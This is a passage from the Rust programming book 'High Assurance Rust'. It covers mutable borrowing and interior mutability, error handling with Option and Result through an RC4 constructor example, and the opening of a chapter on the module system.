<pre><code class="language-ignore">error[E0499]: cannot borrow `x` as mutable more than once at a time
 --&gt; src/main.rs:7:10
  |
6 | let r1 = &amp;mut x; // 1st mutable borrow
  |          ------ first mutable borrow occurs here
7 | let r2 = &amp;mut x; // 2nd mutable borrow - problem!
  |          ^^^^^^ second mutable borrow occurs here
8 |
9 | println!("{}, {}", r1, r2);
  |                    -- first borrow later used here

For more information about this error, try `rustc --explain E0499`.
</code></pre>
<p>But this is OK:</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let mut x = "Hello!".to_string();

let r1 = &amp;mut x; // 1st mutable borrow

// Mutate the string
r1.pop();
r1.push_str(", World");

println!("Modified via r1: {}", r1);
// End of implicit (no open-close brackets) scope for 1st mutable borrow,
// b/c not used again in this function

let r2 = &amp;mut x; // 2nd mutable borrow - OK, not simultaneous!

// Mutate the string via another reference
r2.push('!');

println!("Modified via r2: {}", r2);
<span class="boring">}</span></code></pre></pre>
<p>It prints:</p>
<pre><code class="language-ignore">Modified via r1: Hello, World
Modified via r2: Hello, World!
</code></pre>
<p>The trick with mutable borrows is the requirement that they remain <em>exclusive</em>.
Satisfying that requirement isn't always straightforward, it's a skill gained through experience.</p>
<h3 id="4-the-interior-mutability-pattern"><a class="header" href="#4-the-interior-mutability-pattern">4) The "interior mutability" pattern</a></h3>
<p>The first three ownership "workarounds" (moving, copying, and borrowing) are all that we'll need in this book.
But there's a fourth option, a well-known pattern in Rust.
It's called <strong>interior mutability</strong> and relaxes enforcement of the <code>&amp;T</code> xor <code>&amp;mut T</code> check.</p>
<p>We must still obey the rule, but we don't have to prove mutual exclusion for all possible executions with <em>compile-time verification</em> (static assurance).
That strictness makes encoding certain problems too difficult.
But if it compiles, it's guaranteed.</p>
<p>Instead, interior mutability allows us to do <em>runtime validation</em> (dynamic assurance).
Below are two types often used in the interior mutability pattern.
Don't worry about what these type signatures mean, let's focus on the tradeoffs:</p>
<ul>
<li>
<p><strong><code>Rc&lt;RefCell&lt;T&gt;&gt;</code>'s availability risk:</strong> if a statement in our code attempts to mutably borrow a value that another statement has already mutably borrowed, the thread will <code>panic!</code> (terminate immediately)<sup class="footnote-reference" id="fr-RefCell-1"><a href="#footnote-RefCell">9</a></sup>.</p>
<ul>
<li>E.g. risks terminating single-threaded applications.</li>
</ul>
</li>
<li>
<p><strong><code>Arc&lt;RwLock&lt;T&gt;&gt;</code>'s potential performance impact:</strong> - if thread A requests read access to data while thread B is holding a write lock, thread A is blocked (pauses execution) until thread B releases the lock. But multiple simultaneous readers are allowed<sup class="footnote-reference" id="fr-RwLock-1"><a href="#footnote-RwLock">10</a></sup>.</p>
<ul>
<li>
<p>E.g. risks performance degradation for multi-threaded applications.</p>
</li>
<li>
<p>A reader-writer lock is a common <em>synchronization</em> mechanism in systems programming. It's not unique to Rust.</p>
</li>
</ul>
</li>
</ul>
<p align="center">
  <img width="80%" src="chp3/ref_venn_interior_mut.svg">
  <figure>
  <figcaption><center>Interior mutability: runtime enforced shared readable xor exclusive writeable</center></figcaption><br>
  </figure>
</p>
<p>To reiterate, <strong>we will not be using interior mutability in this book.</strong>
We can build a feature-rich library without it.
And, because a compile-time guarantee doesn't require a fallible runtime check, our implementation will enjoy a higher level of assurance.</p>
<p>Interior mutability is still worth learning and using, eventually.
It's a best practice for some classes of problems, and well-covered in other resources<sup class="footnote-reference" id="fr-TRPL-1"><a href="#footnote-TRPL">11</a></sup>.
But remember - Rust is a <em>big</em> language.
We don't have to master every feature to be productive.</p>
<blockquote>
<p><strong>We're not out of the runtime woods!</strong></p>
<p>Our code does index-based array access, e.g. <code>arr[i]</code>.
That incurs a runtime bounds check.
A failure (out-of-bounds index attempt) would mean <code>panic!</code>, just like <code>RefCell</code>.
But array indexing is easier to reason about.</p>
<p>To justify confidence in indexing logic and more general reliability, Chapter 12 introduces an advanced form of stress testing: differential fuzzing.</p>
</blockquote>
<h2 id="takeaway-11"><a class="header" href="#takeaway-11">Takeaway</a></h2>
<p>We now have a more holistic view of ownership.
Including four ways to work with the borrow checker:</p>
<ol>
<li>
<p><strong>Moving</strong> (transferring) ownership from one variable to another.</p>
</li>
<li>
<p><strong>Copying</strong> (duplicating) data, creating a second, independent, owned instance.</p>
</li>
<li>
<p><strong>Borrowing</strong> (accessing) to data for a subset of its lifetime.</p>
</li>
<li>
<p><del><strong>Interior mutability</strong> - a form of relaxed, runtime ownership enforcement.</del></p>
</li>
</ol>
<p>That's it!
We've covered the most difficult and infamous aspect of the Rust programming language.
Keep these concepts in mind as we write more code, and soon ownership might even become second nature.</p>
<p>Ownership guarantees memory safety.
But Rust is also known for general correctness - for robustness beyond memory safety.
Its error handling story is a major reason for that reputation.
And our next topic.</p>
<hr>
<ol class="footnote-definition"><li id="footnote-BorrowChecker">
<p><a href="https://rustc-dev-guide.rust-lang.org/borrow_check.html"><em>MIR borrow check</em></a>. Guide to Rustc Development (Accessed 2022). <a href="#fr-BorrowChecker-1">↩</a></p>
</li>
<li id="footnote-GeneralTrend">
<p>At some level, that's also true of most Programming Language (PL) innovations (e.g. type systems and annotation-based frameworks).
And it complements the robustness benefits coming from industry development tools/practices (e.g. powerful IDEs and frameworks aiding product creation, and testing/deployment processes underpinning production-quality systems and services). Rust isn't special or a "silver bullet", it's one of many modern development tools. But Rust does tackle an important niche: fast &amp;&amp; memory-safe. <a href="#fr-GeneralTrend-1">↩</a></p>
</li>
<li id="footnote-CHESS">
<p><a href="https://www.darpa.mil/attachments/CHESS-Slides-DISTAR.pdf"><em>CHESS: Computers and Humans Exploring Software Security</em></a>. Dustin Fraze (2018, Public Domain). <a href="#fr-CHESS-1">↩</a></p>
</li>
<li id="footnote-CHESSDesc">
<p><a href="https://www.darpa.mil/program/computers-and-humans-exploring-software-security"><em>Computers and Humans Exploring Software Security (CHESS)</em></a>. William Martin (Accessed 2022). <a href="#fr-CHESSDesc-1">↩</a></p>
</li>
<li id="footnote-ExampleCredit">
<p>To give appropriate credit, this example is based on <a href="https://stackoverflow.com/questions/11137516/scope-vs-lifetime-of-variable">this StackOverflow question</a> and <a href="https://doc.rust-lang.org/book/ch10-03-lifetime-syntax.html">this part</a> of TRPL book. In particular, we use the same ASCII diagram comments of TRPL. <a href="#fr-ExampleCredit-1">↩</a></p>
</li>
<li id="footnote-Gpp">
<p>We compiled this program with command <code>g++ scope.cpp -o scope</code> using <code>g++</code> version 9.4.0 (latest shipping on Ubuntu 20.04 LTS at the time of this writing). No warning was emitted. <a href="#fr-Gpp-1">↩</a></p>
</li>
<li id="footnote-TraitCopy">
<p><a href="https://doc.rust-lang.org/std/marker/trait.Copy.html"><em>Trait <code>std::marker::Copy</code></em></a>. The Rust Team (Accessed 2022). <a href="#fr-TraitCopy-1">↩</a></p>
</li>
<li id="footnote-MISRA_2012">
<p><em>MISRA C: 2012 Guidelines for the use of the C language in critical systems (3rd edition)</em>. MISRA (2019). <a href="#fr-MISRA_2012-1">↩</a></p>
</li>
<li id="footnote-RefCell">
<p><a href="https://doc.rust-lang.org/std/cell/index.html"><em>Module <code>std::cell</code></em></a>. The Rust Team (Accessed 2022). <a href="#fr-RefCell-1">↩</a></p>
</li>
<li id="footnote-RwLock">
<p><a href="https://doc.rust-lang.org/std/sync/struct.RwLock.html"><em>Struct <code>std::sync::RwLock</code></em></a>. The Rust Team (Accessed 2022). <a href="#fr-RwLock-1">↩</a></p>
</li>
<li id="footnote-TRPL">
<p><a href="https://doc.rust-lang.org/book/ch15-05-interior-mutability.html"><em><code>RefCell&lt;T&gt;</code> and the Interior Mutability Pattern</em></a>. by Steve Klabnik, Carol Nichols (Accessed 2022). <a href="#fr-TRPL-1">↩</a></p>
</li>
</ol><div style="break-before: page; page-break-before: always;"></div><meta name="title" content="High Assurance Rust">
<meta name="description" content="Developing Secure and Robust Software">
<meta property="og:title" content="High Assurance Rust">
<meta property="og:description" content="Developing Secure and Robust Software">
<meta property="og:type" content="article">
<meta property="og:url" content="https://highassurance.rs/">
<meta property="og:image" content="https://highassurance.rs/img/har_logo_social.png">
<meta name="twitter:title" content="High Assurance Rust">
<meta name="twitter:description" content="Developing Secure and Robust Software">
<meta name="twitter:url" content="https://highassurance.rs/">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://highassurance.rs/img/har_logo_social.png">
<h1 id="rust-error-handling-6-of-6"><a class="header" href="#rust-error-handling-6-of-6">Rust: Error Handling (6 of 6)</a></h1>
<p>Detecting and handling errors is fundamental to software development in general, but it's an especially pressing topic for software prioritizing robustness and availability.
Error handling is also one area where Rust differentiates itself - both in mechanism and meticulousness.</p>
<p>Broadly speaking, we can bin errors into one of three classes:</p>
<ol>
<li>
<p><strong>Compile-time errors</strong> - Syntax or ownership errors that prevent a single module from compiling. Rust's compiler tends to output actionable error messages in these cases. Of which you'll likely see many, especially when first learning the language. Just remember: you're aiding a safety verification process.</p>
</li>
<li>
<p><strong>Link-time errors</strong> - Symbol resolution errors that prevent multiple modules from composing. Thanks to <code>cargo</code>, linking errors should be a rarity when working on pure-Rust codebases. But they may appear in large, multilingual projects or when using C/C++ libraries as dependencies.</p>
</li>
<li>
<p><strong>Runtime errors</strong> - Errors caused by a broken invariant or an operation failure, at runtime. This class impacts assurance. It's the subject of this section, we'll look at strategies for handling runtime errors in Rust.</p>
</li>
</ol>
<p>Notice that <em>logical errors</em> (e.g. implementing an incorrect algorithm) are not listed above.
We consider these to be general <em>bugs</em> and outside the scope of an error handling discussion.</p>
<p>For errors proper, some developer communities make the below distinction:</p>
<ul>
<li>
<p>"Error" referring specifically to catastrophic failures that a program cannot reasonably handle (e.g. exhausting system memory).</p>
</li>
<li>
<p>"Exceptions" being errors that can be "caught" and handled by programmer-defined logic (e.g. a file doesn't exist).</p>
</li>
</ul>
<p>We don't make that distinction here.
We'll use the term "error" to capture both the catastrophic and handleable cases.</p>
<h2 id="option-vs-result"><a class="header" href="#option-vs-result"><code>Option</code> vs <code>Result</code></a></h2>
<p>Rust's standard library provides two <code>enum</code> types for expressing fallible operations: <code>Option</code><sup class="footnote-reference" id="fr-Option-1"><a href="#footnote-Option">1</a></sup> and <code>Result</code><sup class="footnote-reference" id="fr-Result-1"><a href="#footnote-Result">2</a></sup>.
Strictly speaking, <em>error handling</em> refers only to <code>Result</code>.
But the two are conceptually similar and widely used as function return types, so we'll cover both now.</p>
<h3 id="option"><a class="header" href="#option"><code>Option</code></a></h3>
<p><code>Option</code> conveys that a function could, potentially, have nothing to return.
Even though the operation was completed successfully.
That's normal behavior.</p>
<p>Since we've now covered both enumerations and generics, try interpreting the definition<sup class="footnote-reference" id="fr-Option-2"><a href="#footnote-Option">1</a></sup> of this standard library type:</p>
<pre><code class="language-rust noplaypen">pub enum Option&lt;T&gt; {
    None,
    Some(T),
}</code></pre>
<p>Notice how the <code>None</code> variant of <code>Option</code>'s definition doesn't contain data.
This definition encodes the concept of "some type <code>T</code> XOR nothing".
Ideal for a fallible operation that may return a result.</p>
<p>An example, one we'll become intimately familiar with later, is an ordered set's <code>get</code> method.
Retrieval of an element returns <code>None</code> if that element isn't present the set:</p>
<pre><code class="language-rust noplaypen">use std::collections::BTreeSet;

let set = BTreeSet::from([1, 2, 3]);

assert_eq!(set.get(&amp;2), Some(&amp;2));
assert_eq!(set.get(&amp;4), None);</code></pre>
<blockquote>
<p><strong>Conceptual Checkpoint</strong></p>
<p>There are intricacies in the above <code>BTreeSet</code> usage snippet, related to concepts we introduced in this chapter.
Let's solidify understanding:</p>
<ul>
<li>
<p><code>let set: BTreeSet&lt;i32&gt; = ...</code> is inferred. <code>i32</code> is Rust's default integer type and we're creating a set from an array of 3 integer literals.</p>
</li>
<li>
<p>Thus, <code>get</code> returns <code>Option&lt;&amp;i32&gt;</code> here. The reference operator, <code>&amp;</code>, in this return signature ensures retrieval doesn't <em>move</em> the element out of the set. The set still <em>owns</em> it, we're just checking if it's present.</p>
<ul>
<li>To actually remove the element we'd use a different set method, <code>take</code>, which returns <code>Option&lt;T&gt;</code> (<code>Option&lt;i32&gt;</code> in our example) and transfers ownership.</li>
</ul>
</li>
<li>
<p>Similarly, the argument to <code>get</code> is of type <code>&amp;i32</code> (hence <code>set.get(&amp;2</code>) - we don't want the <code>get</code> function to take ownership of the element we're searching for.</p>
<ul>
<li>Why, given that primitive integers can be <em>copied</em> cheaply? Because <code>BTreeSet&lt;T&gt;</code> is a <em>generic</em> container. Items stored in the set could be large and complex objects, not just <code>i32</code>s.</li>
</ul>
</li>
</ul>
</blockquote>
<h3 id="result"><a class="header" href="#result"><code>Result</code></a></h3>
<p>Now <code>Result</code> has an entirely different use case.
It conveys that a function could fail to complete an operation.
A failure is abnormal, it means a problem needs to be reported or an operation needs to be retried.</p>
<p>In <code>Result</code>'s definition<sup class="footnote-reference" id="fr-Result-2"><a href="#footnote-Result">2</a></sup>, both variants contain data.
The <code>Ok</code> variant encapsulates the output of a successful operation, whereas the <code>Err</code> variant signals failure and encapsulates a custom error type:</p>
<pre><code class="language-rust noplaypen">pub enum Result&lt;T, E&gt; {
    Ok(T),
    Err(E),
}</code></pre>
<p>An example, one we've already seen in the context of Chapter 2's CLI tool, is file I/O.
Attempting to open a file can fail for several reasons - the file might not exist or we do not have permission to read it.
We previously used the <code>?</code> operator to short-circuit error propagation, but we could also explicitly match the file open <code>Result</code> like so:</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use std::fs::File;

match File::open("/path/to/non-existent/file.txt") {
    Ok(f) =&gt; println!("Successfully opened: {:?}", f),
    Err(e) =&gt; eprintln!("Error occurred: {:?}", e),
}
<span class="boring">}</span></code></pre></pre>
<p>Unlike <code>Option</code>, <code>Result</code> is marked with the <code>#[must_use]</code> attribute internally.
Whenever you write a function that returns a <code>Result</code>, the caller <em>must</em> explicitly handle both the <code>Ok</code> and <code>Err</code> cases.
This built-in enforcement lends itself to another MISRA rule:</p>
<blockquote>
<p><strong>[AR, Directive 4.7]</strong> Always test error information returned from functions<sup class="footnote-reference" id="fr-MISRA_2012-1"><a href="#footnote-MISRA_2012">3</a></sup></p>
</blockquote>
<p>While <code>Result</code> provides a convenient mechanism for representing potential failures, and automatically enforces handling, we're still left with the application-specific task of doing the error handling.
Generally, we can take one of three approaches:</p>
<ol>
<li>
<p><strong>Assert invariants</strong> - Terminate the program immediately if an error occurs. Useful when errors cannot be reasonably recovered from.</p>
</li>
<li>
<p><strong>Merge and propagate</strong> - Merge multiple kinds of errors into a single, opaque error and pass it along to the caller. Useful when we want to abstract away irrelevant details, but still give the caller a chance to respond.</p>
</li>
<li>
<p><strong>Enumerate and propagate</strong> - Pass along detailed error information to the caller. Useful when the caller's response action depends on the exact kind of error that occurred.</p>
</li>
</ol>
<p>To make each approach more concrete, and explore some of the finer details, we'll make modifications to Chapter 2's RC4 library and the corresponding CLI tool.</p>
<blockquote>
<p><strong>Rust Errors vs C++ Exceptions</strong></p>
<p>C++ allows two error handling strategies<sup class="footnote-reference" id="fr-CppExcep-1"><a href="#footnote-CppExcep">4</a></sup>:</p>
<ol>
<li>
<p><strong>Return codes:</strong> A function can return a special value, like <code>-1</code> or <code>NULL</code>, to implicitly indicate an error has occurred. But the developer must remember to check for this special case at every callsite and interpret its meaning.</p>
<ul>
<li>Accidentally omitting the check is a common violation of Directive 4.7 above, in both C and C++.</li>
</ul>
</li>
<li>
<p><strong>Thrown exceptions:</strong> exceptions <em>must</em> be caught either by a programmer-defined handler or, if none is provided, the OS itself. So handling is enforced. And they may provide descriptive context.</p>
<ul>
<li>
<p>However, C++ exceptions occur outside of regular code flow - one might be propagated from a function so deeply nested that it appears unrelated. This introduces "invisible" exit points for functions, which both violates a different MISRA rule (one we haven't mentioned) and causes some C++ programmers to consider using exceptions a "bad practice".</p>
</li>
<li>
<p>Additionally, unwinding is a performance bottleneck on multi-core systems (due to a global lock)<sup class="footnote-reference" id="fr-CppSlowExcep-1"><a href="#footnote-CppSlowExcep">5</a></sup>.</p>
</li>
</ul>
</li>
</ol>
<p>With <code>Result</code>, Rust offers the best of both worlds.
Like return codes, <code>Result</code> is passed up via the regular call chain.
Like C++ exceptions, <code>Result</code> can't be accidentally ignored and, via the <code>Err</code> variant, provides meaningful context.</p>
</blockquote>
<h2 id="assert-invariants"><a class="header" href="#assert-invariants">Assert Invariants</a></h2>
<p>In the previous chapter, we wrote a constructor for an RC4 cipher instance.
By convention, constructors are associated functions named <code>new</code>.
Our <code>new</code> function took a single parameter, a key byte array, and asserted an invariant:</p>
<pre><code class="language-rust ignore">pub fn new(key: &amp;[u8]) -&gt; Self {
    // Verify valid key length (40 to 2048 bits)
    assert!(5 &lt;= key.len() &amp;&amp; key.len() &lt;= 256);

    // ...more code here...
}</code></pre>
<p>On one hand, this adheres to an important rule (input validation):</p>
<blockquote>
<p><strong>[RR, Directive 4.14]</strong> External inputs must be validated<sup class="footnote-reference" id="fr-MISRA_2012-2"><a href="#footnote-MISRA_2012">3</a></sup></p>
</blockquote>
<p>On the other hand, we made a debatable decision on behalf of our library's users: if the provided key was too short or too long, we'd terminate the program.
Users won't have a chance to respond if this error condition is hit.</p>
<p>For certain catastrophic failure cases, the Rust language itself makes a similar decision.
For example, say we indexed an array out-of-bounds:</p>
<pre><code class="language-rust ignore">let mut five_item_arr = [0; 5];

for i in 0..6 {
    five_item_arr[i] = i;
}</code></pre>
<p>The loop will run for 6 iterations, <code>i == 0</code> through <code>i == 5</code>, but the array only has 5 valid indexes (<code>0</code> through <code>4</code>).
This program will <em>compile successfully</em> but <em>terminate at runtime</em> with:</p>
<pre><code class="language-ignore">thread 'main' panicked at 'index out of bounds: the len is 5 but the index is 5', src/main.rs:7:5
note: run with `RUST_BACKTRACE=1` environment variable to display a backtrace
</code></pre>
<p>It's a classic "off-by-one" error.
Testing would have helped catch this indexing failure.
But not all fatal invariants are easy to test for, so most real-world programs will contain some assertion-based error handling.
Including implicit cases like this one.</p>
<p>One goal of testing is to show that a program is robust enough to not hit such assertions in practice, due to checks and/or mitigations.
Some number of fatal assertions will always be present, but thorough testing can give us confidence that a program avoids them.</p>
<p>Now in certain cases, we may be able to remove problem potential entirely.
For example, we could have initialized the array using an iterator to eliminate the possibility of an out-of-bounds index:</p>
<pre><code class="language-rust noplaypen">let mut five_item_arr = [0; 5];

for (i, item) in five_item_arr.iter_mut().enumerate() {
    *item = i;
}</code></pre>
<p>Now let's look at the non-fatal cases - errors we can detect and propagate.
We'll refactor our RC4 constructor to demonstrate error propagation strategies.</p>
<h2 id="merge-and-propagate"><a class="header" href="#merge-and-propagate">Merge and Propagate</a></h2>
<p>Recall that if a provided key wasn't the right size, our Chapter 2 RC4 CLI gave the user a descriptive error - essentially re-prompting for a valid-length key.
We accomplished that with <code>clap</code>'s <code>num_args = 5..=256</code> annotation.</p>
<p>Our library itself (not the CLI front-end) asserted the invariant.
The front-end's check just ensured this assertion would never trigger.</p>
<p>Say we wanted the library to enforce a similar check for any program that uses it, front-end or otherwise.
We could have it propagate a single, opaque error like so:</p>
<pre><code class="language-rust ignore">impl Rc4 {
    /// Init a new Rc4 stream cipher instance
    pub fn new(key: &amp;[u8]) -&gt; Result&lt;Self, ()&gt; {
        // Verify valid key length (40 to 2048 bits)
        if (key.len() &lt; 5) || (key.len() &gt; 256) {
            return Err(());
        }

        // Zero-init our struct
        let mut rc4 = Rc4 {
            s: [0; 256],
            i: 0,
            j: 0,
        };

        // ...more initialization code here...

        // Return our initialized Rc4
        Ok(rc4)
    }
}</code></pre>
<p>Choosing the unit type (<code>()</code>, an empty value) instead of a custom error type is a "bare bones" approach.
One typically better-suited in private, internal APIs.
But it does the job, since the caller has to take appropriate action for both the <code>Ok</code> and <code>Err</code> variants of the returned <code>Result</code>.
The <code>Ok</code> variant contains a successfully-initialized cipher.</p>
<h2 id="enumerate-and-propagate"><a class="header" href="#enumerate-and-propagate">Enumerate and Propagate</a></h2>
<p>For public APIs, a custom error <code>enum</code> is likely preferable to <code>()</code>:</p>
<pre><code class="language-rust ignore">#[derive(Debug)]
pub enum Rc4Error {
    KeyTooShort(usize),
    KeyTooLong(usize),
}

impl Rc4 {
    /// Init a new Rc4 stream cipher instance
    pub fn new(key: &amp;[u8]) -&gt; Result&lt;Self, Rc4Error&gt; {
        const MIN_KEY_LEN: usize = 5;
        const MAX_KEY_LEN: usize = 256;

        // Verify valid key length (40 to 2048 bits)
        if key.len() &lt; MIN_KEY_LEN {
            return Err(Rc4Error::KeyTooShort(MIN_KEY_LEN));
        } else if key.len() &gt; MAX_KEY_LEN {
            return Err(Rc4Error::KeyTooLong(MAX_KEY_LEN));
        }

        // Zero-init our struct
        let mut rc4 = Rc4 {
            s: [0; 256],
            i: 0,
            j: 0,
        };

        // ...more initialization code here...

        // Return our initialized Rc4
        Ok(rc4)
    }
}</code></pre>
<p>In the above, we've opted to enumerate both error conditions (too short and too long) instead using a single <code>KeyLengthInvalid</code> variant or similar.
Each variant also contains the threshold length, a minimum for the <code>KeyTooShort</code> variant and a maximum for <code>KeyTooLong</code>.</p>
<p>That level of granularity may or may not be appropriate in this context.
It's definitely not a common pattern in stream cipher libraries.
But our example demonstrates enumerating various internal errors and passing them along.</p>
<p>It allows a caller to <code>match</code> on error <code>enum</code> variants and handle each case accordingly.
Notionally, that'd be something akin to:</p>
<pre><code class="language-rust ignore">use rc4::{Rc4, Rc4Error};

let key = [0x1, 0x2, 0x3];

match Rc4::new(&amp;key) {
    Ok(rc4) =&gt; println!("Do en/decryption here!"),
    Err(e) =&gt; match e {
        Rc4Error::KeyTooShort(min) =&gt; eprintln!("Key len &gt;= {} bytes required!", min),
        Rc4Error::KeyTooLong(max) =&gt; eprintln!("Key len &lt;= {} bytes required!", max),
    },
}</code></pre>
<h3 id="the-error-trait"><a class="header" href="#the-error-trait">The <code>Error</code> Trait</a></h3>
<p>There's one more important piece to the Rust's error handling puzzle: the <code>Error</code> <em>trait</em> in defined in the standard library<sup class="footnote-reference" id="fr-Error-1"><a href="#footnote-Error">6</a></sup>.
Implementing this special trait for our <code>Rc4Error</code> type would have two advantages:</p>
<ul>
<li>
<p>Clearly marking <code>Rc4Error</code> as an error type - not just an <code>enum</code> that happens to have <code>Error</code> in the name.</p>
</li>
<li>
<p>Enabling richer error reporting, via the <code>source</code> and [currently unstable] <code>backtrace</code> methods of the trait.</p>
</li>
</ul>
<p>However, there's a good reason we won't use this trait in our RC4 library.
Recall that our cipher implementation is <code>#![no_std]</code> compatible - it can run any environment, even "bare metal".</p>
<p>The <code>Error</code> trait assumes the presence of an operating system, whose runtime support is needed to capture and print a backtrace.
Thus we can't import <code>std::error::Error</code> in a <code>#![no_std]</code> library.</p>
<blockquote>
<p><strong>Can't we support that use case?</strong></p>
<p>If omitting the <code>Error</code> trait strikes you as an unsatisfying compromise, try <em>feature-gating</em> support for this trait as an exercise.
That'll entail modifying the <code>Cargo.toml</code><sup class="footnote-reference" id="fr-Features-1"><a href="#footnote-Features">7</a></sup> build file and implementing the trait behind a <code>cfg</code> macro<sup class="footnote-reference" id="fr-CondComp-1"><a href="#footnote-CondComp">8</a></sup>.
By convention, this feature would be called <code>std</code> and selected with:</p>
<pre><code class="language-ignore">cargo build --features="std"
</code></pre>
<p>A dependency could chose to enable the optional feature within it's own <code>Cargo.toml</code> entry:</p>
<pre><code class="language-ignore">[dependencies]
rc4 = { path = "../rc4", version = "0.1.0", features = ["std"] }
</code></pre>
<p>This enables the best of both worlds - support embedded systems by default, but allow richer error reporting if a library user enables an optional feature when building for non-embedded targets.</p>
</blockquote>
<h2 id="takeaway-12"><a class="header" href="#takeaway-12">Takeaway</a></h2>
<p>Rust's <code>Result</code> type, not to be confused with the conceptually similar <code>Option</code>, is our main mechanism for reporting runtime errors and enforcing their handling.
Like C++ exceptions, it can't be ignored.
Unlike C++ exceptions, it's part of the regular call chain.</p>
<p>Error handling is essential for assurance, but the specific actions to be taken are ultimately application specific.
We can choose the best approach for each situation: asserting invariants, propagating an opaque error, or propagating specific errors.</p>
<p>That concludes our six-part tour of Rust's core concepts!
The rest of this chapter looks at features and tools that help us to build large, ambitious systems in the language.</p>
<hr>
<ol class="footnote-definition"><li id="footnote-Option">
<p><a href="https://doc.rust-lang.org/std/option/enum.Option.html"><em>Enum <code>std::option::Option</code></em></a>. The Rust Team (Accessed 2022). <a href="#fr-Option-1">↩</a> <a href="#fr-Option-2">↩2</a></p>
</li>
<li id="footnote-Result">
<p><a href="https://doc.rust-lang.org/std/error/trait.Error.html"><em>Enum <code>std::error::Error</code></em></a>. The Rust Team (Accessed 2022). <a href="#fr-Result-1">↩</a> <a href="#fr-Result-2">↩2</a></p>
</li>
<li id="footnote-MISRA_2012">
<p><em>MISRA C: 2012 Guidelines for the use of the C language in critical systems (3rd edition)</em>. MISRA (2019). <a href="#fr-MISRA_2012-1">↩</a> <a href="#fr-MISRA_2012-2">↩2</a></p>
</li>
<li id="footnote-CppExcep">
<p><a href="https://www.codeproject.com/Articles/38449/C-Exceptions-Pros-and-Cons"><em>C++ Exceptions: Pros and Cons</em></a>. Nemanja Trifunovic (2009). <a href="#fr-CppExcep-1">↩</a></p>
</li>
<li id="footnote-CppSlowExcep">
<p><a href="http://www.open-std.org/jtc1/sc22/wg21/docs/papers/2022/p2544r0.html"><em>P2544R0 C++ exceptions are becoming more and more problematic</em></a>. Thomas Neumann (2022). <a href="#fr-CppSlowExcep-1">↩</a></p>
</li>
<li id="footnote-Error">
<p><a href="https://doc.rust-lang.org/std/error/trait.Error.html"><em>Enum <code>std::error::Error</code></em></a>. The Rust Team (Accessed 2022). <a href="#fr-Error-1">↩</a></p>
</li>
<li id="footnote-Features">
<p><a href="https://doc.rust-lang.org/cargo/reference/features.html"><em>Features</em></a>. The Cargo Book (Accessed 2022). <a href="#fr-Features-1">↩</a></p>
</li>
<li id="footnote-CondComp">
<p><a href="https://doc.rust-lang.org/reference/conditional-compilation.html"><em>Conditional compilation</em></a>. The Rust Reference (Accessed 2022). <a href="#fr-CondComp-1">↩</a></p>
</li>
</ol><div style="break-before: page; page-break-before: always;"></div><meta name="title" content="High Assurance Rust">
<meta name="description" content="Developing Secure and Robust Software">
<meta property="og:title" content="High Assurance Rust">
<meta property="og:description" content="Developing Secure and Robust Software">
<meta property="og:type" content="article">
<meta property="og:url" content="https://highassurance.rs/">
<meta property="og:image" content="https://highassurance.rs/img/har_logo_social.png">
<meta name="twitter:title" content="High Assurance Rust">
<meta name="twitter:description" content="Developing Secure and Robust Software">
<meta name="twitter:url" content="https://highassurance.rs/">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://highassurance.rs/img/har_logo_social.png">
<h1 id="the-module-system"><a class="header" href="#the-module-system">The Module System</a></h1>
<p>In a 1994 lecture on the design of C++<sup class="footnote-reference" id="fr-CppD-1"><a href="#footnote-CppD">1</a></sup>, Bjarne Stroustrup, the language's inventor, stated:</p>
<blockquote>
<p>I wanted a tool that provided the support for program organization that Simula<sup class="footnote-reference" id="fr-Simula-1"><a href="#footnote-Simula">2</a></sup> provided.
The help to thinking and help to design that Simula provided.
On the other hand, I wanted something that ran really fast when it had to, like BCPL<sup class="footnote-reference" id="fr-BCPL-1"><a href="#footnote-BCPL">3</a></sup> and C.</p>
</blockquote>
<p>By "program organization", Dr. Stroustrup was referring to C++'s support for object-oriented classes.
Organization support was one half of C++'s winning formula, performance being the other.
Effectively organizing code in a manner amenable to both maintenance and domain abstraction is so critical a problem that solving it for high performance applications allowed C++ to dominate for decades.</p>
<ul>
<li><strong>Rust's Alternative to Classes:</strong> in our prior discussion of high-level data, we saw how traits and structures interact to define behavior via composition - instead of inheritance. You can think of Rust structs and C++ classes as a fundamental first level of program organization.</li>
</ul>
<p>So why bring this up in section about modules<sup class="footnote-reference" id="fr-OGMods-1"><a href="#footnote-OGMods">4</a></sup>, especially when C++ didn't even get a module system until the C++20 standard (some 40 years after inception)?
Because modules are an extended solution to the timeless problem of program organization.</p>
<p>In that same 90s interview, Stroustrup offers a profoundly pragmatist insight:</p>
<blockquote>
<p>My main sort of idea about languages is that a language is someone's response to a set of problems at a given time.
That is, a language is there to solve problems rather than being an interesting item in its own right.
Our problems and our understanding of those problems naturally change over time.</p>
<p>And as long as a language is a good solution to problems that are faced by real programmers in real code, the language will live and the language will grow to meet the needs of the programmers.</p>
</blockquote>
<p>We've already established that Rust's primary value is solving the age-old memory safety problem without sacrificing predictable performance (let's lump safe concurrency under "performance").
With less Undefined Behavior (UB) to debug, we can rapidly build more and more ambitious high-performance systems.</p>
<p>Almost any system worth building will eventually grow in size and complexity.
Customers request new features, development teams onboard new engineers to meet demand, and the codebase starts to expand.
Code organization is so fundamental a problem to "real programmers in real code" that Rust wouldn't be practical without a means to address it.</p>
<p>What tools does Rust afford us, to keep large projects organized and cohesive?
At a high level, we can break down the building blocks like so:</p>
<br>
<p align="center">
  <img width="50%" src="chp3/building_blocks.svg">
  <figure>
  <figcaption><center>Fundamental building blocks, which compose to form complex systems.</center></figcaption><br>
  </figure>
</p>
<ul>
<li>
<p><strong>Items</strong> are exportable pieces of source code: structures, functions, constants, etc. Structures, Rust's class-like abstraction, are arguably our most fundamental organization tool. The top of the program organization hierarchy.</p>
<ul>
<li>A full list of language constructs considered items is available<sup class="footnote-reference" id="fr-Items-1"><a href="#footnote-Items">5</a></sup>. Technically, modules are items. But for the purpose of our current code organization discussion, we'll consider them taxonomically distinct.</li>
</ul>
</li>
<li>
<p><strong>Modules</strong> group related items into cohesive units. They facilitate organizing code within a project, much like namespaces.</p>
<ul>
<li>Some programmers like to follow a "one module per source file" convention. But that 1:1 mapping is entirely optional. Modules are a logical, hierarchical grouping. They're not decided by the layout of a filesystem.</li>
</ul>
</li>
<li>
